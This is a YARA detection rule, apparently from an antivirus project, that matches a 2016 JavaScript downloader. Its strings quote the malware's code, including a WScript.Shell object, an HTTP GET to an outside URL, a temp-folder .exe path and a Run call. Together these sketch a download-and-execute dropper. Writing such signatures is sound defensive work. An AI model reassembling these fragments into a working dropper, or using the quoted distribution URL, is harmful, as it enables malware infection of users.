rule sig_20160329_3d921cf4a9b2d60f81afd7b42d525f6a {
  meta:
    description = "datamaliciousorder - file 20160329_3d921cf4a9b2d60f81afd7b42d525f6a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fc7b9684c64039f853d8001f9cc2f9a1b3518c36219b5ee4c1bd4f19eeab7cca"

  strings:
    $s1  = "function Arjsybb() {return Anezgbcws[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"1H8uoMFIPGN9T.exe\";};" fullword ascii
    $s2  = "do {WScript[Tpbjjmnfl](Rnazyaj() * 11)} while (Bvmxw[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Yqvbby(Xmrpcieum, Jqhclb){return Xmrpcieum - Jqhclb;};" fullword ascii
    $s4  = "var Anezgbcws = function Yqwopqtd() {return WScript[Wbjorgfho](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Bvmxw[Bvkfryrz](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s6  = "function Wbmahg(Kzfvro){Anezgbcws[\"Run\"](Kzfvro, Upbrcupjf, Upbrcupjf);};" fullword ascii
    $s7  = "function Knyfh() {return ((Sihcdymx == true) && (Sihcdymx == Kbeevl)) ? 1 : Upbrcupjf;};" fullword ascii
    $s8  = "function Rnazyaj(){return 22;};" fullword ascii
    $s9  = "var Mjhyuqwlsi = false;" fullword ascii
    $s10 = "var Xrjhaeuet = new this[\"Date\"]();" fullword ascii
    $s11 = "var Sihcdymx = false;" fullword ascii
    $s12 = "Kbeevl = true; " fullword ascii
    $s13 = "var Kbeevl = false;" fullword ascii
    $s14 = "function Jfxeuhyb(Lxzut) {var Snbluh = (1, 2, 3, 4, 5, Lxzut); return Snbluh;};" fullword ascii
    $s15 = "function Axpjqrpsxi()" fullword ascii
    $s16 = "function Vybywcdjl(){return Isamxojjqa;};" fullword ascii
    $s17 = " while (Adkjkf){" fullword ascii
    $s18 = "return Yqvbby(Xnbwmpcc, Apzsb);" fullword ascii
    $s19 = "function Mbeowqb(){return Wbjorgfho;};" fullword ascii
    $s20 = "Sihcdymx = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}